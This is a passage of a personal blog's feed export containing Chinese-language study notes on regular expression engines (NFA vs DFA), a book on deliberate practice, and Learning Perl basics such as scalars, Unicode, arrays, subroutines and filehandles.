Alternation Greedy"></a>Is Alternation Greedy</h3><p>多选结构是按顺序排列的。</p><p>如果多选分支是有序的，而能够匹配同样文本的多选分支又不止一个，就要小心安排多选分支的先后顺序.</p><p>匹配日期时的拆分方法.</p><h2 id="NFA-DFA-and-POSIX"><a href="#NFA-DFA-and-POSIX" class="headerlink" title="NFA, DFA and POSIX"></a>NFA, DFA and POSIX</h2><h3 id="The-Longest-Leftmost"><a href="#The-Longest-Leftmost" class="headerlink" title="The Longest-Leftmost"></a>The Longest-Leftmost</h3><h3 id="POSIX-and-the-Longest-Leftmost-Rule"><a href="#POSIX-and-the-Longest-Leftmost-Rule" class="headerlink" title="POSIX and the Longest-Leftmost Rule"></a>POSIX and the Longest-Leftmost Rule</h3><p>POSIX标准规定，如果在字符串的某个位置存在多个可能的匹配，应当返回的是最长的匹配.</p><h2 id="Summary-NFA-and-DFA-in-Comparison"><a href="#Summary-NFA-and-DFA-in-Comparison" class="headerlink" title="Summary: NFA and DFA in Comparison"></a>Summary: NFA and DFA in Comparison</h2><h3 id="DFA-versus-NFA-Differences-in-the-pre-use-compile"><a href="#DFA-versus-NFA-Differences-in-the-pre-use-compile" class="headerlink" title="DFA versus NFA: Differences in the pre-use compile"></a>DFA versus NFA: Differences in the pre-use compile</h3><p>NFA 的编译过程通常1要快一些，需要的内存也更少一些.</p><h3 id="DFA-versus-NFA-Differences-in-match-speed"><a href="#DFA-versus-NFA-Differences-in-match-speed" class="headerlink" title="DFA versus NFA: Differences in match speed"></a>DFA versus NFA: Differences in match speed</h3><p>一般来说，DFA 的速度和正则表达式无关，而NFA 中两者直接关联.</p><h3 id="DFA-versus-NFA-Differences-in-what-is-matched"><a href="#DFA-versus-NFA-Differences-in-what-is-matched" class="headerlink" title="DFA versus NFA: Differences in what is matched"></a>DFA versus NFA: Differences in what is matched</h3><p>DFA(或者POSIX NFA) 返回最左边的最长的匹配文本. 传统型NFA 可能返回同样的结果，当然也可能是别的文本.</p><h3 id="DFA-versus-NFA-Differences-in-capabilities"><a href="#DFA-versus-NFA-Differences-in-capabilities" class="headerlink" title="DFA versus NFA: Differences in capabilities"></a>DFA versus NFA: Differences in capabilities</h3><p>NFA 能提供一些 DFA 不支持的功能.</p><h3 id="DFA-versus-NFA-Differences-in-ease-of-implementation"><a href="#DFA-versus-NFA-Differences-in-ease-of-implementation" class="headerlink" title="DFA versus NFA: Differences in ease of implementation"></a>DFA versus NFA: Differences in ease of implementation</h3><p>The soul of NFA matching is backtracking.</p>]]></content>
    
    
    <categories>
      
      <category>Regex</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>刻意练习笔记</title>
    <link href="/2022/07/05/%E5%88%BB%E6%84%8F%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/07/05/%E5%88%BB%E6%84%8F%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="心理表征"><a href="#心理表征" class="headerlink" title="心理表征"></a>心理表征</h2><p>心理表征是一种与我们大脑正在思考的某个物体、某个观点、某些信息或者其他任何事物相对应的心理结构，或具体或抽象。</p>]]></content>
    
    
    <categories>
      
      <category>Books</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learning Perl Notes</title>
    <link href="/2022/07/04/Learning-Perl-Notes/"/>
    <url>/2022/07/04/Learning-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="2022-x2F-5-x2F-25"><a href="#2022-x2F-5-x2F-25" class="headerlink" title="2022&#x2F;5&#x2F;25"></a>2022&#x2F;5&#x2F;25</h1><h2 id="page-21-29"><a href="#page-21-29" class="headerlink" title="page 21~29"></a>page 21~29</h2><p>Perl 程序并不需要用什么特殊的文件名或扩展名，甚至不用扩展名就最好不要用。</p><p>Perl 总是将版本号看作是三位数表示的，如<code>use 5.010</code></p><p>Perl 的注释是从井号(#)开始到行尾结束。</p><p>好多Perl程序可能根本不用子程序。</p><p>Perl程序并不需要变量声明的部分。</p><p>换行符\n(newline character).</p><p>分号的目的是分隔不同的Perl语句，而不是断行。</p><p>让后续调用跳过编译，将程序代码编译后驻留到内存中。</p><p>perldoc命令，用来阅读Perl及其相关扩展和工具程序的说明文档。</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="p30～33"><a href="#p30～33" class="headerlink" title="p30～33"></a>p30～33</h3><p>Perl内部，总是按“双精度浮点数”的要求保存数字并进行运算的，也就是说，Perl内部并不存在整数值。</p><p>IEEE-745格式中，双精度能表示15位的精度。</p><p>Perl允许在整数直接量中插入下划线，将若干位数分开。如<code>61_298_040_283_768</code><br>为了避免歧义，没有使用逗号。</p><p>八进制0开头，十六进制0x开头，二进制0b开头。</p><p>双星号表示乘幂: <code>2**3</code> 表示2的3次方。</p><p>空字符在Perl中没有特殊意义。</p><p>Perl中字符串的长度没有限制。</p><p>Perl完全支持Unicode。</p><p>想要在源代码中使用Unicode书写直接量的话，需要手工加上utf8编译指令 <code>use utf8;</code> .</p><h2 id="附录C-Unicode入门"><a href="#附录C-Unicode入门" class="headerlink" title="附录C Unicode入门"></a>附录C Unicode入门</h2><p>Unicode字符集(Unicode Character Set).是字符(character)到代码点(code point)的抽象关系映射。</p><p>可以不用考虑操作系统的区别。</p><hr><h2 id="查询的资料"><a href="#查询的资料" class="headerlink" title="查询的资料"></a>查询的资料</h2><hr><p><a href="https://blog.csdn.net/hezh1994/article/details/78899683?utm_source=app&app_version=5.4.0">参考1</a><br><a href="https://blog.csdn.net/u010411264/article/details/45258629?utm_source=app&app_version=5.4.0">参考2</a></p><hr><h3 id="代码点"><a href="#代码点" class="headerlink" title="代码点"></a>代码点</h3><p>code point，指一个编码表中的某个字符对应的代码值，也就是Unicode编码表中每个字符对应的数值，Unicode中，代码点用十六进制书写，并加上U+前缀，如字符A对应的编码值是<code>U+0041</code>.</p><h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>用一个字节表示字符，一个字节有八位256种状态。</p><p>一共定义了128个字符，只是用了一字节的后七位，最前面一位统一规定为0.</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>128个字符无法表示完其他语言。</p><h3 id="Unicode出现"><a href="#Unicode出现" class="headerlink" title="Unicode出现"></a>Unicode出现</h3><p>提供一种标准方案来展示世界上所有语言中的所有字符。</p><p>Unicode只是一个字符集，没有规定字符对应的二进制码如何存储。这样导致的问题是，不知道用2个字节表示的是一个字符还是两个字符。</p><p>为了解决Unicode的编码问题，诞生了UTF-8(变长编码)和UTF-16，还有UTF-32(定长编码)，它们都是编码方式。</p><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>实现了对ASCII码的向后兼容。</p><p>UTF-8是使用最广泛的一种Unicode编码方式。</p><p>最大特点是可变长。根据字符的不同变换长度。</p><p>编码规则：<br>    1. 对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。<br>    2. 对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第 N + 1 位设为0，剩余的 N - 1 个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充</p><h3 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h3><p>一个概念，“平面”。</p><p>Unicode定义全世界字符时，通过分区定义，每个区可以存放65536个(<code>2^16</code>)字符。目前一共有17个(<code>2^4+1</code>)平面，因此，现在整个Unicode字符集的大小是<code>2^21</code></p><p>基本平面(BMP), U+0000<del>U+FFFF, 所有常见的字符都在这个平面。<br>辅助平面(SMP), U+010000</del>U+10FFFF, 包含剩下的字符。</p><hr><h3 id="UTF-8-1"><a href="#UTF-8-1" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>UCS Transformation Format 8-bit,的缩写。是一种编码方式。</p><hr><p><a href="http://www.cl.cam.ac.uk/~mgk25/ucf/utf-8-history.txt">来源故事</a></p><hr><p>使用Windows，最好选用UTF-16.</p><p><mark>字素(grapheme)</mark>就是字形(glyph). 同一个字素的构成方式可能不止一种，也许只用了一个字符，也许组合了多个字符。</p><p><mark>字素的分解和组合形式</mark>.<br>组合形式，多个字符合并为单个字符并用一个代码点表示。</p><p>表示同一个字素的几个字符构成了相应的分解版本。</p><p>计算机关心的是字符而不是字素。</p><p>打开UTF-8编译指令：<br><code>use utf8;</code><br>其告诉perl解释器按照UTF-8编码，方式解析源代码。</p><p>Unicode编码除了代码点外还有名字，如</p><h1 id="2022-x2F-5-x2F-26"><a href="#2022-x2F-5-x2F-26" class="headerlink" title="2022&#x2F;5&#x2F;26"></a>2022&#x2F;5&#x2F;26</h1><h2 id="p34-p52"><a href="#p34-p52" class="headerlink" title="p34~p52"></a>p34~p52</h2><p><mark>单引号和双引号之间的字符串不同。</mark></p><ul><li>单引号中，除了单引号和反斜线字符外，单引号内所有字符都代表他们自己。只有在反斜线后接续单引号或者反斜线时，才表示转义。</li><li>双引号中，反斜线可以转义许多控制字符。</li></ul><p><mark>字符串操作符</mark>：</p><ul><li>concatenation operator, 连接操作符，<code>.</code>如<code>”hello” . “world”</code><ul><li>String repetition operator, 字符串重复操作符，<code>x</code>如<code>”fred” x 3</code>.重复操作符的左操作数必然是字符串类型。</li></ul></li></ul><p>数字和字符串会根据操作符自动转换。<br>大多数时候不用关心数字和字符串的区别。</p><p><mark>Perl的内置警告信息：</mark></p><pre><code class="hljs">#!usr/bin/perluse warnings;</code></pre><p>利用<code>diagnostics</code>获取跟详细的问题描述。</p><pre><code class="hljs">#!/usr/bin/perluse diagnostics;</code></pre><p>一种优化程序的方法，关闭警告信息。</p><p>用<code>-M</code>参数开启<code>diagnostics</code></p><pre><code class="hljs">$perl -Mdiagnostics ./my_program</code></pre><p>标量变量的名称以<code>$</code>开头，这个符号也称魔符“sigil”，然后是Perl标识符，区分大小写。如<code>$name</code>和<code>$Name</code>, 并不局限于用ASCII字符。</p><p>魔符的含义是“取单个东西”。</p><p>大部分变量名习惯使用全小写。全大写一般为表示特殊意义的Perl保留变量。</p><p>perlvar文档可查询所有Perl特殊变量的名称。</p><p><mark>双目赋值操作符</mark>:<br>如<code>$fred += 5;</code> <code>$str .= “ ”;</code></p><p><mark>变量内插</mark>:<br>使用双引号可以把标量变量替换为其当前值。如</p><pre><code class="hljs">$meal = “brontosaurus steak”;$barney = “fred ate a $&#123;meal&#125;”;    #$barney 现在是“fred ate a brontosaurus steak”</code></pre><p>打印变量值不必使用变量内插的方式，如<code>print $fred</code>.</p><p>用花括号<code>&#123;&#125;</code>将变量名围起来以避免歧义。如：</p><pre><code class="hljs">$what = “brontosaurus steak”print “Fred ate 3 $(what)s./n”;</code></pre><p><mark>使用代码点(code point)创建字符</mark>.</p><ul><li>chr()函数，将代码点转换为对应字符。</li><li>ord()函数，将字符转换为代码点。</li></ul><p><mark>操作符的优先级</mark>，所有同时在Perl和C里出现的操作符，它们的优先级和结合性都是相通的。</p><p>优先级相同时，通过结合性判断。在顺序不确定是，就用括号。</p><p><mark>字符串的比较操作符：</mark><br>eq, ne, lt, gt, le, ge。</p><p><mark>if控制结构</mark>，一定要用表示界限的花括号。</p><p>字符串‘0’和0是同一个标量值。</p><p><mark>获取用户输入:</mark><br><code>&lt;STDIN&gt;</code> 其返回的字符串一般在末尾都会带有换行符。</p><p>使用<code>chomp()</code>操作符去除末尾换行符。其只能作用于单个变量，且变量的内容必须为字符串。只删除一个换行符。</p><p><code>chomp()</code>函数返回实际移除的字符数。</p><p><mark>undef值</mark><br>被用作数字时表现为0，被用作字符串时表现为空字符串。Perl通常会对undef的值发出警告。</p><p><mark>defined函数</mark><br>用于判断某个字符串时undef还是空字符串。如果是undef，返回假，否则返回真。</p><p><mark>创建undef值</mark><br>使用undef操作符。如</p><pre><code class="hljs">$madonna = under; #回到虚无，仿佛从未用过。</code></pre><h2 id="p53～69"><a href="#p53～69" class="headerlink" title="p53～69"></a>p53～69</h2><p><mark>列表和数组</mark>表示复数(plural).</p><p>列表(list)是标量的有序集合，数组(array)是存储列表的变量，更精确的说，列表是数据，数组是变量。</p><p>数组和列表可以包含任意多个元素。</p><p>Perl“去除不必要的限制”的哲学理念。</p><p>数组的名称空间和标量的名称空间是完全分开的。</p><p>负数索引，从数组尾端往回计数。</p><p><mark>列表直接量</mark><br>由圆括号内用逗号隔开的一串数据表示，这些数据称为列表元素。<br><code>(1,2,3)</code></p><p><mark>范围操作符</mark><br><code>..</code>如<code>(1..100) #100个整数构成的列表</code>, 该操作符会从左边的数字计数到右边，每次加一。</p><p><mark>qw简写</mark><br>quoted word, 加上引号的单词，Perl会将其当成单引号内的字符串处理，如：</p><pre><code class="hljs">(“fred”, “barney”, “betty”, “wilma”, “dino”)#同( fred barney betty Wilma dino)</code></pre><p>qw算是一种引用的形式，所以不能将注释放在qw列表中，常单独成行，如：</p><pre><code class="hljs">qw(    fred    barney    betty    wilma    dino)    </code></pre><p>也可以用除圆括号以外的定界符。</p><p>Perl的座右铭是“There’s More Than One Way To Do It”</p><p>列表可赋值。</p><p><mark>@字符</mark><br><code>@rocks</code>可读作“所有的rocks”.</p><pre><code class="hljs">@rocks = qw(bedrock slate lava);</code></pre><p>$表示标量和@表示数组的由来</p><blockquote><p>Larry宣称美元符号看起来像$calar，at看起来像@rray。<br><mark>pop和push操作符</mark><br>Perl并不擅长使用索引值来访问数组。<br>pop负责取出数组中最后一个元素并将其作为返回值返回。</p></blockquote><p>pop也常用来删除数组中的最后一个元素。</p><p><mark>Perl的一个惯例：只要不会因为拿掉括号而改变愿意，括号就是可省略的。</mark></p><p>push，添加一个元素(或一串元素)到数组的尾端。</p><p>pop和push都只能用来操作数组。</p><p><mark>shift和unshift操作符</mark><br>操作数组的开头。</p><pre><code class="hljs">$m = shift(@array);unshift(@array, 5);</code></pre><p><mark>splice操作符</mark><br>添加或移除数组中间的某些元素。</p><p>在双引号中若要显示@符号，加上’\’来转义。</p><p><mark>foreach控制结构</mark><br>循环，能逐项遍历列表中的值。</p><pre><code class="hljs">@rock = qw/ bedrock slate lava /;foreach $rock (@rocks) &#123;    ...&#125;</code></pre><p><mark>Perl最喜欢用的默认变量：$_</mark></p><pre><code class="hljs">foreach (1..10) &#123;   #默认用$_作为控制变量    print “I can count to $_!\n”;&#125;$_ = “Yabba dab a doo\n”print;  #默认打印$_变量的值</code></pre><p><mark>reverse操作符</mark><br>读取列表或数组的值，并按相反的次序返回该列表。不会修改传进来的参数。</p><p><mark>sort操作符</mark><br>根据内部的字符编码顺序对它们进行排序。</p><p><mark>each操作符</mark></p><p><mark>标量上下文与列表上下文</mark><br>概念: 同一个表达式出现在不同的地方会有不同的意义。</p><h1 id="2022-x2F-5-x2F-27"><a href="#2022-x2F-5-x2F-27" class="headerlink" title="2022&#x2F;5&#x2F;27"></a>2022&#x2F;5&#x2F;27</h1><h2 id="p69～72"><a href="#p69～72" class="headerlink" title="p69～72"></a>p69～72</h2><p><mark>在列表上下文中使用产生标量的表达式</mark><br>将undef赋值给数组并不会清空该数组。</p><p><mark>强制指定标量上下文</mark><br>用伪函数scalar。它不是真正的函数，只不过告诉Perl这里要切换到标量上下文。</p><p>使用Control+D告知操作系统，不会再有任何输入。</p><p>将数组交给chomp，可以去掉每个元素的换行符。</p><p>Perl会分配富裕的内存来节省事后的操作时间。</p><p>编程技巧：<br>直接打印输入</p><h2 id="第四章-子程序"><a href="#第四章-子程序" class="headerlink" title="第四章 子程序"></a>第四章 子程序</h2><h3 id="p73～"><a href="#p73～" class="headerlink" title="p73～"></a>p73～</h3><p>子程序(subroutine).</p><p>子程序名属于独立的名称空间。</p><p><mark>定义子程序</mark><br>关键字sub，子程序名和花括号。如：</p><pre><code class="hljs">sub marine &#123;    $n += 1;    print “Hello, sailor number $n!\n”;&#125;</code></pre><p>在Perl中，一般不区分有返回值的函数(function)和无返回值的过程(procesure).</p><p>子程序一般不需要事先声明。</p><p>子程序的定义是全局的。</p><p>使用<code>&amp;</code>调用子程序，通常加上一对括号，如：</p><pre><code class="hljs">&amp;(marine);</code></pre><p>通常把对子程序的调用称为calling子程序。</p><p><mark>返回值</mark><br>在Perl中，所有的子程序都有一个返回值。</p><p>子程序最后一次运算的结果就是返回值。</p><p>返回的是最后执行的表达式的结果，但并非是代码的最后一行。</p><p>如：</p><pre><code class="hljs">sub sum_of_fred_and_barey &#123;print “Hey, you called the sum_of_fred_and_barney subroutine!\n”;$fred + $barney; #这不是返回值！print “Hey, I’m returning a value now!\n”;&#125;</code></pre><p>返回值为1.</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>argument。</p><p>Perl会自动将参数列表化名为特殊的数组变量@_，该变量在子程序执行时有效。</p><h4 id="子程序中的私有变量"><a href="#子程序中的私有变量" class="headerlink" title="子程序中的私有变量"></a>子程序中的私有变量</h4><p>默认情况下，Perl里面所有的变量都是全局变量。</p><p>使用<code>my</code>操作符来创建私有变量，称之为词法变量(lexical variable).</p><p>Perl中，分号的作用是分隔语句，而不是必须的语句结尾标志。</p><pre><code class="hljs">my($m, $n) = @_;    #对子程序的参数命名</code></pre><p>这一行语句会创建私有变量并为它们赋值。</p><p>这是一个列表上下文.</p><h4 id="变长参数列表"><a href="#变长参数列表" class="headerlink" title="变长参数列表"></a>变长参数列表</h4><p>自检参数列表：</p><pre><code class="hljs">sub max &#123;    If (@_ != 2) &#123;        Print “WARNING!”    &#125;    .    .    .&#125;</code></pre><p><mark>空参数列表</mark></p><p><mark>词法变量my</mark><br>可在任何语句块中使用。<br>注意，my操作符在没加括号时，只能用来声明单个词法变量。</p><p><mark>在日常的Perl编程中，最好对每个新变量都使用my声明</mark></p><h1 id="第四章-子程序-1"><a href="#第四章-子程序-1" class="headerlink" title="第四章 子程序"></a>第四章 子程序</h1><p>区分子程序和内置函数，子程序是由用户定义的，而函数则不一定.</p><p>一般的变量都是全局变量.</p><p>要注意检查返回值。 </p><p>特殊的数组变量<code>@_</code>用于存放参数列表。</p><p><code>my</code> 操作符，创建私有变量。</p><p>直接使用数组“名称”来取得数组元素的个数。</p><h2 id="pop-and-push-shift-and-unshift"><a href="#pop-and-push-shift-and-unshift" class="headerlink" title="pop and push, shift and unshift"></a>pop and push, shift and unshift</h2><p>pop and push do things to the end of an array.</p><p>shift and unshift do things to the start of an array.</p><h2 id="The-if-Control-Structure"><a href="#The-if-Control-Structure" class="headerlink" title="The if Control Structure"></a>The if Control Structure</h2><p>The if control structure must have those block curly braces around the conditional code.</p><p><code>foreach</code> 也必须要有花括号.</p><h2 id="Notes-on-Lexical-my-Variables"><a href="#Notes-on-Lexical-my-Variables" class="headerlink" title="Notes on Lexical (my) Variables"></a>Notes on Lexical (my) Variables</h2><p>Those lexical variables can actully be used in any block.</p><p>区分:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($num) = @_;<br><span class="hljs-keyword">my</span> $num = @_;<br></code></pre></td></tr></table></figure><p>上下文含义不同。</p><p>最好对每一个新变量都使用my声明,</p><p>Perl中的默认变量<code>$_</code>.</p><p>如果编译器在调用子程序前看到过子程序的定义或者Perl通过语法规则判断它只能是子程序调用，就可以省略<code>&amp;</code>.</p><h2 id="持久性私有变量"><a href="#持久性私有变量" class="headerlink" title="持久性私有变量"></a>持久性私有变量</h2><p>Using <code>state</code> to define.</p><p>不能在列表上下文中初始化数组和哈希类型的state变量.</p><p>Using <code>Ctrl-D</code> to stop getting values from <STDIN>.</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>One string can be seen as one element of an array.</p><p>Can’t use defined(@array).</p><p>检查一个变量是否初始化</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">defined</span> <span class="hljs-variable">$var</span>) <br></code></pre></td></tr></table></figure><p>检查一个数组是否为空</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">if</span> (<span class="hljs-variable">@array</span>) &#123;<span class="hljs-selector-tag">return</span>&#125;;<br></code></pre></td></tr></table></figure><h1 id="CHAPTER-5-Input-and-Output"><a href="#CHAPTER-5-Input-and-Output" class="headerlink" title="CHAPTER 5 Input and Output"></a>CHAPTER 5 Input and Output</h1><p>需要知道那些情况会返回<code>undef</code>.</p><p>判断是否到文件末尾</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">while</span> (<span class="hljs-keyword">defined</span>(<span class="hljs-variable">$line</span> = &lt;<span class="hljs-variable constant_">STDIN</span>&gt;))<br></code></pre></td></tr></table></figure><p>or </p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">while</span> <span class="hljs-comment">(&lt;STDIN&gt;)</span><br></code></pre></td></tr></table></figure><p>There is no connection between the line-input operator and Perl’s favorite default variable.</p><h2 id="Input-from-the-Diamond-Operator"><a href="#Input-from-the-Diamond-Operator" class="headerlink" title="Input from the Diamond Operator"></a>Input from the Diamond Operator</h2><p>The diamond operator: &lt;&gt;, it’s actually a special kind of line-input operator.</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">./mytac <span class="hljs-built_in">file</span><br></code></pre></td></tr></table></figure><p>and the mytac file:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">print</span> <span class="hljs-keyword">reverse</span> &lt;&gt;;<br></code></pre></td></tr></table></figure><p>前面的 <code>&lt;STDIN&gt;</code> 是从标准输入获取, 毕竟 <code>&lt;&gt;</code> 里面是 <code>STDIN</code>, 单纯的 <code>&lt;&gt;</code> 就是从用户指定的位置读取.<br>file:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">one</span><br><span class="hljs-literal">two</span><br><span class="hljs-literal">three</span><br></code></pre></td></tr></table></figure><p>will print:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">three</span><br><span class="hljs-literal">two</span><br><span class="hljs-literal">one</span><br></code></pre></td></tr></table></figure><p>The invocation arguments 大抵是命令行参数。</p><p><code>-</code> 连字符通常代表标准输入流。</p><p>钻石操作符从指定位置读取，如命令行参数。</p><p>不加参数时，chomp会直接作用在<code>$_</code>上.</p><p>The invocation arguments 存储在<code>@ARGV</code>中.</p><p>可重新初始化<code>@ARGV</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@ARGV = <span class="hljs-keyword">qw</span><span class="hljs-comment"># larry moe curly #;</span><br></code></pre></td></tr></table></figure><p>Perl把数组内插到字符串中时，会在每个元素之间加上空格。</p><p><mark>为何输出结果先发送至缓冲区</mark><br>访问磁盘缓慢且效率低.</p><p><code>print &lt;&gt;;</code> 相当于Unix下的cat命令.</p><p><code>print sort &lt;&gt;;</code> 相当于Unix下的sort命令.</p><p>一条规则：假如它看起来像函数调用，它就是一个函数调用.</p><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><p>区分：<code>print @array;</code> 和 <code>print &quot;@array&quot;;</code></p><p>The front one print a list of items, the next one print a string. 后者有分隔符. 都输出了数组中的全部元素, 只不过后者以空格分隔, 前者连在一起.</p><h3 id="用printf格式化输出"><a href="#用printf格式化输出" class="headerlink" title="用printf格式化输出"></a>用printf格式化输出</h3><p>要输出恰当的数字形式，可以使用<code>%g</code>, 可以把<code>g</code>看作”Good conversion for this number”</p><p><code>printf</code>最常用在字段式的数据输出上，指定字段宽度，默认为右对齐。</p><p>A <code>*</code> inside the format string takes the next argument as a width:</p><h3 id="Arrays-and-printf"><a href="#Arrays-and-printf" class="headerlink" title="Arrays and printf"></a>Arrays and printf</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;The items are:\n&quot;</span>.(<span class="hljs-string">&quot;%10s\n&quot;</span> <span class="hljs-keyword">x</span> @items), @items;<br><span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;%*s&quot;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&quot;wilma&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="Filehandles"><a href="#Filehandles" class="headerlink" title="Filehandles"></a>Filehandles</h3><p>A name of a connection(和文件名区分). The connection is between your Perl process and the outside world.</p><p>感觉可以把这个看作<code>link</code>. 和文件操作符也挺像的.</p><p>Recommend to use all uppercase letters in the name of your filehandle.</p><p>Six special filehandle nemes:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">STDIN</span><br><span class="hljs-attribute">STDOUT</span><br><span class="hljs-attribute">STDERR</span><br><span class="hljs-attribute">DATA</span><br><span class="hljs-attribute">ARGV</span><br><span class="hljs-attribute">ARGVOUT</span><br></code></pre></td></tr></table></figure><h3 id="打开filehandle"><a href="#打开filehandle" class="headerlink" title="打开filehandle"></a>打开filehandle</h3><p>建议全用大写字母来命名文件句柄.</p><p>都是行处理模式.</p><p>使用<code>open</code> operator.</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">open</span> CONFIG, <span class="hljs-string">&#x27;&lt;dino&#x27;</span>;<br></code></pre></td></tr></table></figure><p>后面的是文件名, <code>&lt;</code>, <code>&lt;&lt;</code>, <code>&gt;</code>, <code>&gt;&gt;</code> 表示输入输出.<br>or</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $selected_output = <span class="hljs-string">&#x27;my_output&#x27;</span>;<br><span class="hljs-keyword">open</span> LOG, <span class="hljs-string">&quot;&gt; $selected_output&quot;</span>;<br></code></pre></td></tr></table></figure><p>三参数写法 (最好写成这种)：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">open</span> BEDROCK, <span class="hljs-string">&#x27;&lt;&#x27;</span>, $file_name;<br></code></pre></td></tr></table></figure><p>以特定编码写数据到某个文件：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">open <span class="hljs-built_in">LOG</span>, <span class="hljs-string">&#x27;&gt;&gt;:encoding(UTF-8)&#x27;</span>, <span class="hljs-symbol">$file</span>_name;<br></code></pre></td></tr></table></figure><p>layer, 层的概念和编码转换略有不同，我们可以选择不同的层叠加起来(就是因为能叠加才叫做层)，产生不同的效果.</p><p>判断执行：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">my $success = open <span class="hljs-keyword">LOG</span>, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;logfile&#x27;</span>;<br><span class="hljs-keyword">if</span> (! $success) &#123;<br>    <span class="hljs-params">...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>open</code>的返回值，如果为真则为成功，为假则为失败。</p><h3 id="关闭filehandle"><a href="#关闭filehandle" class="headerlink" title="关闭filehandle"></a>关闭filehandle</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">close BEDROCK<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><mark>Small Conclusion</mark><br>filehandle, 用于在Perl程序中操作外部文件。</p><h3 id="用die处理致命错误"><a href="#用die处理致命错误" class="headerlink" title="用die处理致命错误"></a>用die处理致命错误</h3><p><code>die</code> 命令能中止程序并发出错误信息告知原因。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (! <span class="hljs-keyword">open</span> LOG, <span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;logfile&#x27;</span>) &#123;<br>    <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create logfile: $!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>$!</code> 为特殊变量，存放解释性的系统错误信息。只有在系统服务请求失败后才有用。</p><p>程序名保存在特殊变量<code>$0</code>中。</p><p>若在<code>die</code>后面加上换行符，就不会显示行号和文件名。</p><h3 